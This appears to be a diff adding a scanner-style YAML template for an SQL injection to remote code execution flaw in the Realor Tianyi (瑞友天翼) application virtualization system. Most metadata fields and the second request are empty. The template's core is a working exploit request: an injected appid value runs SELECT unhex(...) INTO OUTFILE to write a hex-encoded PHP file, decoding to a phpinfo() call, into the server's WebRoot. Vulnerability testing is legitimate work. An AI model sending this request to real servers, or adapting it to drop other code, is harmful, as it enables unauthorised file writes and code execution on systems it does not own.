@@ -1,0 +1,16 @@
+id:
+
+info:
+  name: 瑞友天翼应用虚拟化系统sql注入RCE漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /index.php?s=/Admin/appsave&appid=3%27%29%3Bselect+unhex%28%273c3f70687020706870696e666f28293b203f3e%27%29+into+outfile+%27.%5C%5C..%5C%5C..%5C%5CWebRoot%5C%5C229775.xgi%27%23
+response1:
+  code: 200
+  body: result
+requests2:
+response2:
